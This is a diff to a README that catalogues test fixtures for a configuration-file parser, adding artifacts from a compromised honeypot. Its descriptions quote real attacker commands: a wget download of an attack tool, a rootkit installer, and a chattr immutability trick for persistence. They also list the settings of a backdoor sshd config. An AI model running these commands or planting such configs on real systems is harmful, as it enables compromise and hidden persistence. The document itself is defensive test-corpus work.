@@ -10,12 +10,13 @@ Organized by `file_type` (matching `backend/parsers/registry.py` keys).
 
 ## Currently-implemented parsers
 
-### `auth_log/` — 5 files
+### `auth_log/` — 6 files
 - `auth.log` — original user-provided sample (pre-existing)
 - `loghub_linux_2k.log` — logpai/loghub `Linux/Linux_2k.log` (2,000-line anonymized Linux auth corpus)
 - `loghub_openssh_2k.log` — logpai/loghub `OpenSSH/OpenSSH_2k.log` (sshd-focused)
 - `lastlog_audit_compromised` — franckferman/LastLog-Audit `samples/compromised.auth.log` (realistic red-team scenario)
 - `masterparser_example` — securityjoes/MasterParser `01-Logs/MasterParser-Example-auth.log`
+- `honeynet_scan29_rh72_secure` — Honeynet Project Scan 29 (`linux-suspended.tar.bz2`), extracted from `/var/log/secure` of the compromised Red Hat 7.2 honeypot (Aug 2003). Tiny (179 B, 2 entries) but a genuine RHEL "secure" log fragment — `xinetd[732]: START: telnet pid=15169 from=193.109.122.5` showing the inetd-era telnet service entry, plus an sshd identification-string-failure event. Distinct from the Debian-style `auth.log` formats already in the corpus.
 
 ### `authorized_keys/` — 6 files
 - `authorized_keys` — original (pre-existing)
@@ -25,7 +26,7 @@ Organized by `file_type` (matching `backend/parsers/registry.py` keys).
 - `puttygen_attacker_immutable` — IOC from a separate 2024 Cowrie attacker (session `0790cce5c223`, `honeypot-japan`, src 94.103.125.37). Distinct from `outlaw_attacker_dropped`: PuTTYgen-format key (`AAAAB3NzaC1yc2EAAAADAQABAAABAQ...`, comment `rsa-key-20230629`), and the dropping operator follows it with `chattr +ai ~/.ssh/authorized_keys` to make the file append-only AND immutable — defeating naive cleanup. Useful for testing parsers against PuTTY-format keys (different MPI encoding than OpenSSH-generated `AAAAB3NzaC1yc2EAAAABJQ...`).
 - `ethos_miner_attacker_dropped` — IOC from a 2020 Cowrie attacker targeting EthOS cryptomining rigs (sweetie-data session `382575d10851`, src 80.229.157.225, login as `user`). Distinct from the other two attacker keys: no comment field, key is appended (not replacing the file), the campaign reads `claymore.stub.conf` / `claymore-zcash.stub.conf` / `sgminer.conf` afterward to steal mining wallet addresses. Companion bash_history fixture: `cowrie_2020_ethos_miner_recon_382575d1`.
 
-### `bash_history/` — 15 files
+### `bash_history/` — 16 files
 
 Benign / numbered-history variant (2):
 - `jc_ubuntu_18_04_history`, `jc_centos_7_7_history` — kellyjonbrazil/jc `tests/fixtures/{ubuntu-18.04,centos-7.7}/history.out`
@@ -48,6 +49,9 @@ Real attacker sessions from Cowrie honeypots (13, one per distinct attack patter
   > Extracted, not synthesized: each file is the verbatim `input` fields from every `cowrie.command.input` event in a single attacker session, one command per line. Canonical `.bash_history` format containing real attacker commands.
   > Round 4 removed 3 near-duplicate sessions: `cowrie_2020_03_25938f9d` (differed from cc95d998 by 1 IP+filename token — same Mirai loader campaign) and `cowrie_2024_za_sensor_{40308dc3,c6f9f3c5}` (same busybox-recon pattern as 0bb8edce, differing only in the random busybox marker token).
 
+Real post-compromise host bash_history (1):
+- `honeynet_scan29_rh72_root_post_compromise` — Honeynet Project Scan 29, extracted from `.bash_history` at the FS root (inode 3188; the `/root/.bash_history` symlink was redirected to /dev/null by the attacker for evasion). 14 lines, 235 B, captures the actual post-compromise interactive shell of the attacker on a Red Hat 7.2 honeypot (Aug 2003). Distinctive content: `cd /dev/shm/sc; ./install sbm79.dtc.apu.edu` (rootkit installer with academic-network masquerade hostname), `wget izolam.net/sslstop.tar.gz` (SSL-stop tool), `kill -9 21510 21511 23289 23292 23302` (terminating Apache to free port 443). Distinct from the Cowrie samples — those capture the attacker's *typed input as the SSH server saw it*; this is the *resulting host-side `.bash_history` file*, the side defenders actually find on disk.
+
 ### `etc_hosts/` — 5 files
 - `centos_hosts` — original (pre-existing)
 - `jc_ubuntu_18_04_hosts`, `jc_centos_7_7_hosts` — kellyjonbrazil/jc `tests/fixtures/{ubuntu-18.04,centos-7.7}/hosts.out`
@@ -66,41 +70,49 @@ Real attacker sessions from Cowrie honeypots (13, one per distinct attack patter
 - `defectdojo_v6_40` — DefectDojo/sample-scan-files `nmap/nmap_v6.40.xml`
 - `mozilla_minion_v6_40` — mozilla/minion-nmap-plugin `etc/sample-nmap-output.xml`
 
-### `passwd/` — 5 files
+### `passwd/` — 6 files
 - `endlessm_base_passwd_master` — endlessm/base-passwd `passwd.master` (Debian minimal default passwd)
 - `jc_ubuntu_18_04_passwd`, `jc_centos_7_7_passwd`, `jc_osx_10_14_6_passwd` — kellyjonbrazil/jc `tests/fixtures/*/passwd.out`
 - `cowrie_honeyfs_passwd` — cowrie/cowrie `honeyfs/etc/passwd` (honeypot fake passwd served to attackers)
+- `honeynet_scan29_compromised_rh72` — Honeynet Project Scan 29, extracted `/etc/passwd` from the compromised Red Hat 7.2 honeypot (Aug 2003). Real lived-in distro passwd; the attacker added an `admin:x:15:50:User:/var/ftp:/bin/bash` line (gid=50 reusing the `ftp` group, /var/ftp home, bash shell) and altered the existing `ftp` user's gid from 50 → 0 (root group). The parser filters UID < 1000 (rule 7) so neither attacker change is reflected in `host_users_found` — the fixture exercises that filtering on a known-tainted file.
 
-### `private_key/` — 24 files
+### `private_key/` — 25 files
 - `id_rsa`, `dss_key` — original (pre-existing; non-production keys)
 - 12 paramiko test keys from round 1: RSA / ECDSA (256/384/521) / Ed25519 / Ed448, including password-encrypted, funky-padding, and `blank_rsa` edge cases
 - Round 2 additions from paramiko/paramiko: `paramiko_test_rsa_openssh_nopad`, `paramiko_test_ecdsa_password_384`, `paramiko_test_ecdsa_password_521`, `paramiko_ed25519_funky_padding_password`, `paramiko_badhash_key1_ed25519`, `paramiko_badhash_key2_ed25519` (corrupted-hash edge cases), `paramiko_support_rsa_lonely`, `paramiko_demos_user_rsa`
 - `openssh_regress_ecdsa_sk_test1`, `openssh_regress_ed25519_sk_test1` — openssh/openssh-portable `regress/unittests/sshkey/testdata/{ecdsa,ed25519}_sk1`. FIDO2/U2F security-key private keys (`sk-ecdsa-sha2-nistp256@openssh.com` / `sk-ssh-ed25519@openssh.com`). Distinct format from the paramiko corpus — exposes parser handling of hardware-backed keys: ecdsa-sk currently parses but reports `key_type: ecdsa-sha2-nistp256` (missing the SK suffix); ed25519-sk fails with "unsupported format" warning. Snapshot locks in this current behavior for explicit regression on future fixes.
+- `honeynet_scan29_rootkit_ssh1_host_key` — Honeynet Project Scan 29, extracted from `/lib/.x/s/s_h_k` of the compromised Red Hat 7.2 honeypot. **SSH protocol 1 private host key** (`SSH PRIVATE KEY FILE FORMAT 1.1` magic, distinct from PEM/OPENSSH formats already in the corpus). Dropped by the attacker's rootkit alongside its hidden sshd binary. Parser produces "Could not parse private key — unsupported format or corrupted" warning — locks in current behavior so future SSH1 support is a deliberate change.
 
-### `public_key/` — 11 files
+### `public_key/` — 12 files
 - `id_rsa.pub`, `dss_key.pub` — original (pre-existing)
 - Round 1: `paramiko_test_rsa_pub`, `paramiko_ecdsa_256_cert`, `paramiko_ed25519_cert`, `paramiko_rsa_cert`
 - Round 2: `paramiko_support_rsa_cert`, `paramiko_support_rsa_missing_cert` (cert-pub-without-matching-key edge case), `paramiko_demos_user_rsa_pub`
 - `openssh_regress_ecdsa_sk_test1`, `openssh_regress_ed25519_sk_test1` — openssh/openssh-portable `regress/unittests/sshkey/testdata/{ecdsa,ed25519}_sk1.pub`. FIDO2 security-key public-key formats (`sk-ecdsa-sha2-nistp256@openssh.com` / `sk-ssh-ed25519@openssh.com`); both parse cleanly as `authorized_key`-style entries. Companion fixtures to the private-key SK pair above.
+- `honeynet_scan29_rootkit_ssh1_host_key_pub` — Honeynet Project Scan 29, companion `/lib/.x/s/s_h_k.pub`. **SSH1-format public key** (`1024 33 <decimal-modulus> root@fred.psiware.net` — note the attacker's hostname leaked in the comment). Distinct from the OpenSSH-format `ssh-rsa AAAA…` keys in the rest of the corpus. Parser warns "Line 1: unrecognised format, skipping" — same regression-locking purpose as the private-key counterpart.
 
-### `shadow/` — 4 files
+### `shadow/` — 6 files
 - `shadow` — original (pre-existing)
 - `jc_ubuntu_18_04_shadow`, `jc_centos_7_7_shadow` — kellyjonbrazil/jc `tests/fixtures/*/shadow.out`
 - `cowrie_honeyfs_shadow` — cowrie/cowrie `honeyfs/etc/shadow` (hashes are fake honeypot bait)
+- `honeynet_scan29_compromised_rh72` — Honeynet Project Scan 29, extracted `/etc/shadow` from the compromised RH 7.2 honeypot. Two real recoverable `$1$` md5crypt hashes — root's password and the attacker-added `admin` user's. Distinct from the existing shadow corpus (which only has `$6$` sha512crypt fixtures from modern distros): tests the parser's handling of legacy md5crypt.
+- `honeynet_scan29_compromised_rh72_backup` — same image, `/etc/shadow-` rotation backup. Captured *before* the attacker set the root password and added the admin user — root's hash field is empty (`root::12247:0:99999:7:::`). Edge case that triggers the parser's locked-account/no-hash filtering on the typically-active `root` line.
 
-### `ssh_config/` — 20 files
+### `ssh_config/` — 21 files
 - Pre-existing: `config`, `ssh-config-basic`, `ssh-config-patterns`, `ssh-config-proxy`
 - `openssh_portable_default` — openssh/openssh-portable `ssh_config`
 - `jc_generic_ssh_config{1..5}` — kellyjonbrazil/jc `tests/fixtures/generic/ssh_config[1-5]`
 - 10 paramiko config edge-case fixtures (`basic`, `canon`, `match-all`, `match-exec`, `match-host-glob`, `match-host-glob-list`, `match-host-negated`, `match-localuser`, `hostname-tokenized`, `invalid`) — paramiko/paramiko `tests/configs/`
+- `honeynet_scan29_rh72_default` — Honeynet Project Scan 29, extracted `/etc/ssh/ssh_config` from the RH 7.2 honeypot. Vintage 2001-era OpenSSH client config (`$OpenBSD: ssh_config,v 1.16`); a single `Host *` block with all settings commented out. Parser captures the wildcard pattern.
 
-### `sshd_config/` — 7 files
+### `sshd_config/` — 9 files
 - `openssh_portable_default.conf` — openssh/openssh-portable `sshd_config` (upstream default)
 - `jc_generic_sshd_config_raw` — kellyjonbrazil/jc `tests/fixtures/generic/sshd_config`
 - `jc_generic_sshd_T`, `jc_generic_sshd_T_2` — kellyjonbrazil/jc `generic/sshd-T.out` (output of `sshd -T`, a config-dump variant)
 - `ansible_blockinfile_openbsd_default` — ansible/ansible `test/integration/targets/blockinfile/files/sshd_config` (OpenBSD 1.100 upstream default)
 - `saltstack_debian_pkg_generated` — saltstack/salt `tests/integration/files/conf/_ssh/sshd_config` (Debian package-generated variant)
 - `saltstack_git_pillar_minimal` — saltstack/salt `tests/integration/files/file/base/git_pillar/ssh/server/files/sshd_config` (9-line minimal config)
+- `honeynet_scan29_rh72_default` — Honeynet Project Scan 29, extracted `/etc/ssh/sshd_config` from the RH 7.2 honeypot. Vintage 2001-era settings (`$OpenBSD: sshd_config,v 1.38`): `Protocol 2,1` (SSH1+SSH2 both enabled), `ServerKeyBits 768`, `KeyRegenerationInterval 3600`, `PermitRootLogin yes`. Distinct from modern upstream defaults already in the corpus.
+- `honeynet_scan29_rootkit_dropped` — same image, `/lib/.x/s/sshd_config` — the **attacker's hidden backdoor sshd config**, dropped alongside the rootkit's own `s_h_k` host key. Notable settings: `PermitEmptyPasswords yes`, `RhostsRSAAuthentication yes`, `FascistLogging no`, `QuietMode yes`, `HostKey /lib/.x/s/s_h_k`, `PidFile /lib/.x/s/pid` — a real malware artifact, not a synthesized one.
 
 ### `sudoers/` — 5 files
 - `sudoers` — original (pre-existing)
@@ -342,6 +354,7 @@ These gaps are genuine — either the file is private by convention (history fil
 - [jasonmpittman/cowrie-log-analyzer](https://github.com/jasonmpittman/cowrie-log-analyzer) — real March 2020 Cowrie attacker session JSON (extracted to `bash_history/cowrie_2020_*`)
 - [EfeEmirYuce/Cowrie-Honeypot-Log-Analysis-Engine](https://github.com/EfeEmirYuce/Cowrie-Honeypot-Log-Analysis-Engine) — ~130 MB of 2024 Cowrie JSON logs from a South Africa sensor (selected sessions extracted to `bash_history/cowrie_2024_*`)
 - [0xsha/sweetie-data](https://github.com/0xsha/sweetie-data) — MIT — multi-honeypot capture covering Dec 2019–Feb 2020 (~2.9 GB cowrie JSON across 105 daily logs); selected attacker sessions extracted to `bash_history/cowrie_2020_*` and `authorized_keys/ethos_miner_*`
+- [Honeynet Project — Scan of the Month #29](https://honeynet.onofri.org/scans/scan29/) — Honeynet Project terms permit analysis & redistribution for research. The 102 MB `linux-suspended.tar.bz2` is a VMware-suspended Red Hat 7.2 honeypot compromised on 2003-08-10; the 1 GB ext3 partition was extracted via `qemu-img convert -f vmdk -O raw` + Sleuth Kit (`mmls`/`fls`/`icat`). Files extracted to `passwd/honeynet_scan29_*`, `shadow/honeynet_scan29_*`, `ssh_config/honeynet_scan29_*`, `sshd_config/honeynet_scan29_*` (incl. the rootkit-dropped backdoor config), `bash_history/honeynet_scan29_*` (real post-compromise root shell history), `private_key/` + `public_key/honeynet_scan29_*` (SSH protocol 1 host keys from the rootkit), `auth_log/honeynet_scan29_*` (RHEL `secure` log fragment).
 - [canonical/netplan](https://github.com/canonical/netplan) — GPL-3.0 — network YAML examples
 - [sudo-project/sudo](https://github.com/sudo-project/sudo) — ISC — upstream sudoers example
 - [endlessm/base-passwd](https://github.com/endlessm/base-passwd) — GPL-2.0 — Debian passwd.master
